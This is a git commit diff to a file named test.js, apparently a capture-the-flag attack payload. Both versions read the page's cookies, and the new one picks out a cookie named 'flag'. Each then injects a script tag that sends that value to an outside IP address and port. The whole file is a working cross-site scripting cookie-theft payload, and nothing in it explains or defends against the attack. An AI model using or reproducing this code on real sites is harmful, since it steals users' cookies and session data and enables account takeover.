d48da60e2c056045d83e00d8e56bfa8116973ca7
Thanray Tian <874800988@qq.com>
2017-01-18 13:32:27 +0800

    test

--- test.js
+++ test.js
@@ -1,4 +1,10 @@
-var flag=document.cookie;
+function getCookie(name) {
+  var value = "; " + document.cookie;
+  var parts = value.split("; " + name + "=");
+  if (parts.length == 2) return parts.pop().split(";").shift();
+}
+
+var flag=getCookie('flag');
 var script=document.createElement('script');
 script.src='http://119.29.81.170:7892/?flag='+flag;
 document.body.appendChild(script);
